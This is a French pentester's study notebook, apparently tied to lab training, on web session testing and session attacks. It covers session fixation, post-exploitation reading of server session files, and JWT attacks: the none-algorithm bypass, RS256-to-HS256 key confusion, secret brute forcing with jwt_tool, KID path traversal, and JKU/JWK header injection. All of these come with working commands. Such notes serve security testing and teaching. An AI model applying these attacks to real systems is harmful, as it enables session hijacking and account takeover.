

- [ ] [[#GESTION DES SESSIONS]]
- [ ] [[#ATTAQUES SUR SESSIONS]]


---

# GESTION DES SESSIONS

- [ ] [[#Randomisation des token]]
- [ ] [[#Temps de timeout de session]]
- [ ] [[#Identifier la partie du token vérifiée par le serveur]]
- [ ] [[#Deconnexion utilisateur]]
- [ ] [[#Expiration de token]]


## Randomisation des token

> [!TIP]
> Si chiffrement utilisé faible (token court, ou données statiques ne randomisant pas assez le token -> entropy insuffisante)
> 
> Capturer plusieurs token pour les analyser.
> On peut utiliser Burp Sequencer pour analyser ça -> https://portswigger.net/burp/documentation/desktop/tools/sequencer/getting-started
> https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/analyzing-session-token-generation

exemples :

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

```
141233
141234
141237
141238
141240
```

Décoder cookie Base64

```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
```



## Temps de timeout de session

Determiner la durée de vie de la session -> https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/session-timeout


## Identifier la partie du token vérifiée par le serveur

Il arrive que le serveur ne verifie pas l'entièreté du token. On peut checker ça avec Burp Character Frobber -> https://portswigger.net/burp/documentation/desktop/testing-workflow/analyzing/opaque-data/parts-of-token


## Deconnexion utilisateur

1. S'assurer que la session est bien terminée après avoir logout (simplement rafraichir la page).
2. S'assurer que la deconnexion de l'utilisateur est forcée après avoir reset son mot de passe.


## Expiration de token

1. S'authentifier
2. Ouvrir une fenetre de navigation privée et s'authentifier avec le même compte
3. Refaire l'étape 2 plusieurs fois (3 / 4 fois)
4. Essayer de rejouer le tout premier token de session et voir s'il est toujours valide





---

# ATTAQUES SUR SESSIONS


- [ ] [[#Session Fixation]]
- [ ] [[#XSS]]
- [ ] [[#CSRF]]
- [ ] [[#OPEN REDIRECT]]
- [ ] [[#Obtenir SESSION ID sans interaction avec l'utilisateur]]
- [ ] [[#Obtaining Session Identifiers Post-Exploitation (Web Server Access)]]
- [ ] [[#JWT Tokens]]


# Session Fixation

> [!OBJ]
> Fixer un SESSID qui sera envoyé à la victime afin de procéder au Session Hijacking

> [!TIP]
> Générer un cookie de session et forger une requête avec ce cookie de session afin de l'envoyer à la victime.
> Il sera par la suite possible d'hijacker la session de la victime grâce au cookie en question
> Les tokens de sessions doivent être regénérés aléatoirement après chaque authent réussie pour prévenir l'attaque
> Un token doit également avoir un timeout afin de faire expirer la session

> [!TIP]
> - The assigned session identifier pre-login remains the same post-login `and` Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

## Identifier

exemple d'URL

```URL
http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
```

Si le token indiqué dans l'URL correspond au cookie de session alors potentiellement vulnérable

## Exploiter

1. Ouvrir une nouvelle session en navigation privée et naviguer vers le lien potentiellement vulnérable en changeant le token

```URL
http://oredirect.htb.net/?redirect_uri=/complete.html&token=iControlThisCookie
```

2. Vérifier dans le stockage de cookies si la valeur indiqué dans l'URL s'y retrouve.![[Pasted image 20250306024403.png]]

3. Envoyer une URL forgée avec un cookie de session valide à la victime
4. Procéder au hijack de sa session

> [!TIP]
> Ou tester de rajouter à l'aveugle le cookie dans une URL telle que  http://insecure.exampleapp.com/login -> http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue et rafraichir la page pour voir si la valeur indiquée se fixe comme cookie


# XSS

Vol de cookie possible si pas de httpOnly ? -> [[XSS (Cross-Site Scripting)#**SESSION HIJACKING**]]



# CSRF

 [[CSRF - XSRF (Cross-Site Request Forgery)]]



# OPEN REDIRECT

Peut on voler un token avec une redirection non controlée ? -> [[OPEN REDIRECT]]





# Obtenir SESSION ID sans interaction avec l'utilisateur

> [!Prerequis]
> - Flag **Secure** absent du cookie.
> - Trafic HTTP non sécurisé.
> - Etre sur le même réseau local que la victime.

Sniffing (Wireshark / Tcpdump)






# Obtaining Session Identifiers Post-Exploitation (Web Server Access)

Aller récupérer les cookies de session en post-exploitation du serveur

## PHP

```bash
locate php.ini
```

```bash
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
```

```bash
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

## Java

https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html

```bash
locate SESSIONS.ser
```

## .NET

https://www.csharp.com/UploadFile/225740/introduction-of-session-in-Asp-Net/

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server



---
# #JWT Tokens

Signature du token:

1. L'entête et le payload sont encodés en base64url
2. La concaténation des 2 (b64urlentete.b64urlpayload) est ensuite haché en SHA256 à l'aide de l'algorithme HMAC avec la clé secrète et apparait sous forme hexadécimal.
3. Le hash est ensuite encodé en Base64url et concaténé à la fin du token -> b64urlentete.b64urlpayload.b64urlhash

https://auth0.com/blog/json-web-token-signing-algorithms-overview/
https://jwt.io/
https://tools.onecompiler.com/hmac-sha512
https://github.com/ticarpi/jwt_tool


- [ ] [[#None Algo Attack]]
- [ ] [[#RS256 -> HS256 Algo Attack]]
- [ ] [[#Bruteforce de secret]]
- [ ] [[#JWK HEADER Injection]]
- [ ] [[#KID HEADER Injection]]
- [ ] [[#JKU HEADER Injection]]
- [ ] [[#Révocation de Token]]


## None Algo Attack

1. Copier le token dans https://jwt.io/
2. Remplacer l'algorithme par none (**"none"**, **"None"**, **"nOnE"**, **"NONE"**)
3. Remplacer la valeur du payload (username par admin par ex)

Si erreur signature invalide alors la supprimer.

Enfin injecter le token dans la session et rafraichir la page.

## RS256 -> HS256 Algo Attack

Passer de RS256 (asymétrique) à HS256 (symétrique) pourrais pousser le serveur a utiliser la clé publique comme clé secrète.
### Option 1

Récupérer la clé publique depuis un certificat et la mettre au format pem:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

Dans jwt.io --> insérer le token et modifier le payload et le header pour y mettre HS256

Puis avec jwt_tool:

```bash
python3 jwt_tool.py <token> -X k -pk pubkey.pem
```

### Option 2

Passer la clé publique au format hexadecimal (attention au 0a à la fin de l'hexa qui peut être en trop, ou pas, a tester ):

```bash
echo "-----BEGIN PUBLIC KEY-----              
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA18StSZxwWvbQiTPM7SRi
dPrcW/Uty9bsB3oaKTlkLksOHUgZ2svBEwc8UtZHtvgb/LZEGnDwEEQptA6pST8a
846gHRmzrtxT8wbVesGyGAnavUmCLyFrS7rhXe4aYEpsdIIjNBq6C/f7tWia/+Sd
4Fz+XBmc76QBqNMWau242G3k+mewmJhX7kMQ0OHDN5rSM1FvUQ32LhZiXz/3tt5P
G/mLO3zN5OnzlQyB6xgHBNV6KdEdapr9icew3Ph2JLI6AY4iFXLr01fZ7ikIPUXn
HGYZ2Ji7DbkYhFKnBLcvfkGj0Gu1HZtzcmM42kOHtSAH/hlFGkHbvToydjPoGENv
6QIDAQAB
-----END PUBLIC KEY-----" | xxd -p | tr -d "\\n"
```

Générer une signature HMAC en SHA256 avec le token (entête et payload) et la clé publique au format hexa 

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<keyhexa>
```

Convertir le SHA256 en Base64url:

```bash
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('18e61fe88b59882f438a11b324a3e03f659254860eb6d01373ade444a0a37044')).replace('=','')\")"
```

l'ajouter au token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.<signatureb64url>
```

## Bruteforce de secret

wordlist -> [https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list](https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list)

```bash
python3 -m pip install termcolor cprint pycryptodomex requests --break-system-packages
```

```bash
python3 Desktop/tools/WEB/JWT/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -d jwt.secrets.list -C
```

Editer les valeurs et signer le token avec la clé secrète trouvée précédemment

```bash
python3 Desktop/tools/WEB/JWT/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -T -S hs512 -p "key"
```


## JWK HEADER Injection

Dans Burp JWT Editor

1. Ajouter une clé RSA (generate)
2. dans BURP repeater aller dans JWT
3. Attack -> Embedded JWK

## KID HEADER Injection

> [!TIP]
> Le KID permet au serveur d'identifier la clé à utiliser pour vérifier la signature.
> 
> Mais pas de structure concrete pour cet ID .
> 
> Tester directory traversal dans le KID en le faisant pointer vers un fichier qui contient du contenu que nous connaissons (une page web par exemple).
> Générer une signature en utilisant le contenu du fichier en question comme secret.
> 
> /proc/sys/kernel/ftrace_enabled -> contenu à 0 ou 1 -> certaines applications check si le fichier de signature est vide donc peut ne pas marcher -> dans ce cas pointer vers une page du serveur web.
> 
> alternative -> pointer vers /dev/null qui ne contient rien et enlever la signature


Tester [[SQLi (Injections SQL)]] et [[Command Injection]] également dans le KID (peut être stockée en base de données)

## JKU HEADER Injection

> [!TIP]
> Tester SSRF qui pointe vers un jwk.json que l'on host [[SSRF (Server-Side Request Forgery)#]]

Endpoint communs (a checker, peut-être publique)
- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/api/v1/keys`
- [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

jwk.json exemple (remplacer par les valeurs de notre clé RSA)

```
{ 
	"keys": [ 
		{ 
		  "kty": "RSA",
		  "e": "AQAB",
		  "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab", 
		  "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ" 
		}
	]
}
```

Dans BURP JWT Editor
 1. Générer une clé RSA et la hoster dans un jwk.json
 2. Editer le payload
 3. Remplacer le KID par celui contenu dans notre jwk.json
 4. Ajouter un jku qui pointe vers l'url de notre jwk.json


## Révocation de Token

> [!TIP]
> Dans certains cas les tokens sont révoqués d'une mauvaise manière, en se basant sur une blacklist dans laquelle le token est enregistré tel quel lors de sa création, au lieu de se baser sur un id présent dans l'entête ou le payload tel que le JTI.

1. Tester de rajouter le padding à la fin de la signature (= ou `==`) pour garder un token valide et bypasser la blacklist. 

2. Tester d'augmenter la valeur d'expiration.

3. Verifier que les Refresh Token sont bien revoqués après changement du mot de passe d'un utilisateur en les rejouant pour voir si on peut continuer d'obtenir un access token.

